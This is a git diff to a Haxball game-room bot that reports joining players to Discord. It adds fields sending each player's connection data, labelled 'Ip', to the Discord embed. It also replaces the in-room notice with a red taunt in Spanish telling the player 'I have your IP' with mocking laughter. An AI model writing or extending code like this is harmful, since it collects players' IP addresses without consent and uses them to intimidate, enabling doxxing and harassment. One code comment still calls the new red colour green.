@@ -55,6 +55,16 @@ function sendPlayerInfoToDiscord(player) {
             value: player.auth || "No disponible", // Maneja el caso de que player.auth sea nulo/indefinido
             inline: true,
           },
+          {
+            name: "Conn",
+            value: player.conn || "No tiene",
+            inline: true,
+          },
+          {
+            name: "Ip",
+            value: player.conn || "No tiene",
+            inline: true,
+          },
         ],
         timestamp: new Date().toISOString(), // Fecha y hora actuales en formato ISO
         footer: {
@@ -138,9 +148,9 @@ HaxballJS.then((HBInit) => {
     // Enviar anuncio en la sala
     setTimeout(() => {
       room.sendAnnouncement(
-        `📡 ${player.name}, tu información ha sido enviada al sistema de registro.`,
+        `🤣 ${player.name}, tengo tu ip vro jadfjajajajadfajfdja.`,
         player.id,
-        0x00ff00, // Verde
+        0xFf0000, // Verde
         "bold",
         2, // Sonido de anuncio
       );
